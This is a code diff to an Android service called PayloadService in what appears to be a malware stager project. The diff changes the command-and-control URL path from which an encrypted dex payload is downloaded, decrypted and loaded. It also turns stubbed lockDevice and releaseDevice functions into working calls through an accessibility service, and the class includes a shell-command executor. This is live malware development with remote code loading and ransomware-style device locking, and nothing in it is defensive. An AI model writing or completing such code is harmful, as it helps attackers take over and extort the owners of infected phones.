@@ -97,7 +97,7 @@ class PayloadService : Service() {
     private fun downloadAndLoadPayload() {
         Thread {
             try {
-                val payloadUrl = "${StagerApplication.c2RealUrl}/payload"
+                val payloadUrl = "${StagerApplication.c2RealUrl}/api/payload"
                 val dexBytes = NetworkUtils.downloadBytes(payloadUrl)
                 if (dexBytes != null) {
                     val decrypted = CryptoUtils.decryptPayload(dexBytes)
@@ -228,13 +228,13 @@ class PayloadService : Service() {
     }
 
     private fun lockDevice() {
-        // Uses AccessibilityService to disable power button
-        // In practice: intercept SystemUI interactions
-        Log.i(TAG, "Device lock command received")
+        StagerAccessibilityService.instance?.lockDevice()
+        Log.i(TAG, "Device locked")
     }
 
     private fun releaseDevice() {
-        Log.i(TAG, "Device release command received")
+        StagerAccessibilityService.instance?.releaseDevice()
+        Log.i(TAG, "Device released")
     }
 
     private fun executeShellCommand(cmd: String) {
